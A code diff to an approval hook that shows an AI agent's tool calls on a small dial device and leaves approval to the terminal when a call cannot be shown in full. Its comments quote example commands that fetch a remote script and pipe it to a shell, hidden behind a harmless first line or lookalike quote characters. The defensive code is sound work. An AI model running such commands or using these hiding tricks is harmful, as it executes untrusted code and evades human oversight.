@@ -17,7 +17,7 @@ export interface ApprovalBody {
   tool: string
   summary: string
   cwd?: string
-  /** The dial cannot show the command whole: it shows the agent waiting, and the terminal's prompt decides. */
+  /** The dial cannot show the call whole: it shows the agent waiting, and the terminal's prompt decides. */
   terminalOnly?: true
 }
 
@@ -69,31 +69,46 @@ function cutBytes(text: string, max: number): string {
   return cut
 }
 
-/**
- * A command the dial cannot show whole, so Allow there would approve what the person never read: more than one line
- * (`npm test\ncurl evil.sh | sh` reads "npm test"), a line longer than the card holds, or a character outside printable
- * ASCII, which the dial draws as quoting or spacing that bash takes as a letter (`echo “; curl x | sh; ”` runs curl).
- */
-function terminalOnly(input: unknown): boolean {
-  const command = isRecord(input) && typeof input.command === 'string' ? input.command : ''
-  const lines = command.split(/[\r\n]/).map((line) => line.trim()).filter(Boolean)
-  return lines.length > 1 || Buffer.byteLength(lines[0] ?? '') > MAX_SUMMARY_BYTES || /[^\x20-\x7e\r\n]/.test(command)
-}
-
-/** The card's one line under "Allow <tool>?": what the tool acts on, or its name when the input does not say. */
-export function approvalSummary(tool: string, input: unknown): string {
+/** What a tool the dial may approve acts on ('' when its input does not say), or null when its card shows only a name. */
+function actsOn(tool: string, input: unknown): string | null {
   const field = (name: string): string => {
     const value = isRecord(input) ? input[name] : undefined
     return typeof value === 'string' ? value : ''
   }
-  const mcp = /^mcp__(.+?)__(.+)$/.exec(tool)
-  // A command's first line with text: one that opens with a blank line would otherwise show the tool's name, not the command.
-  const shown = tool === 'Bash' ? field('command').trim().split(/[\r\n]/)[0]
+  return tool === 'Bash' ? field('command')
     : FILE_TOOLS.has(tool) ? field('file_path')
       : tool === 'NotebookEdit' ? field('notebook_path')
         : tool === 'WebFetch' ? hostOf(field('url'))
-          : mcp ? `${mcp[1]}: ${mcp[2]}`
-            : ''
+          : null
+}
+
+/**
+ * A call the dial cannot show whole, so Allow there would approve what the person never read. Its card shows only a
+ * name (an MCP tool, any tool but those [actsOn] reads, a missing path or host), or a command of more than one line
+ * (`npm test\ncurl evil.sh | sh` reads "npm test"), a line longer than the card holds, or a character outside printable
+ * ASCII, which the dial draws as quoting or spacing that bash or a path takes as a letter (`echo “; curl x | sh; ”`
+ * runs curl).
+ */
+function terminalOnly(tool: string, input: unknown): boolean {
+  const target = actsOn(tool, input)
+  if (target === null) return true
+  if (tool === 'Bash') {
+    const lines = target.split(/[\r\n]/).map((line) => line.trim()).filter(Boolean)
+    return lines.length !== 1 || Buffer.byteLength(lines[0]) > MAX_SUMMARY_BYTES || /[^\x20-\x7e\r\n]/.test(target)
+  }
+  // A host in other letters arrives as punycode (xn--…): ASCII, but not the name the person would read.
+  return !target || Buffer.byteLength(target) > MAX_SUMMARY_BYTES || /[^\x20-\x7e]/.test(target)
+    || (tool === 'WebFetch' && /(^|\.)xn--/.test(target))
+}
+
+/** The card's one line under "Allow <tool>?": what the tool acts on, or its name when the input does not say. */
+export function approvalSummary(tool: string, input: unknown): string {
+  const target = actsOn(tool, input)
+  const mcp = /^mcp__(.+?)__(.+)$/.exec(tool)
+  // A command's first line with text: one that opens with a blank line would otherwise show the tool's name, not the command.
+  const shown = target === null ? (mcp ? `${mcp[1]}: ${mcp[2]}` : '')
+    : tool === 'Bash' ? target.trim().split(/[\r\n]/)[0]
+      : target
   // The core refuses a control character in any field (core/deviceHookCalls.ts), which would lose the card.
   return cutBytes((shown.trim() || tool).replace(/\p{Cc}/gu, ' '), MAX_SUMMARY_BYTES)
 }
@@ -121,7 +136,7 @@ async function approvalBody(stdin: AsyncIterable<Buffer | string>): Promise<Appr
     sessionId, tool: tool.slice(0, MAX_TOOL_CHARS), summary: approvalSummary(tool, toolInput),
     // The core refuses a cwd it cannot hold, and the whole card with it: one it would refuse is not sent.
     ...(typeof cwd === 'string' && cwd.length <= MAX_CWD_CHARS && !/\p{Cc}/u.test(cwd) ? { cwd } : {}),
-    ...(tool === 'Bash' && terminalOnly(toolInput) ? { terminalOnly: true as const } : {}),
+    ...(terminalOnly(tool, toolInput) ? { terminalOnly: true as const } : {}),
   }
 }
 
@@ -131,7 +146,7 @@ export async function runApprove(deps: ApproveDeps): Promise<0> {
     const body = await approvalBody(deps.stdin)
     if (!body) return 0
     const decision = await deps.post(body)
-    // Posted so the dial shows the agent waiting; whatever comes back, the dial never showed the whole command.
+    // Posted so the dial shows the agent waiting; whatever comes back, the dial never showed the whole call.
     const output = body.terminalOnly ? '' : OUTPUT[decision]
     if (output) deps.out(output)
   } catch {
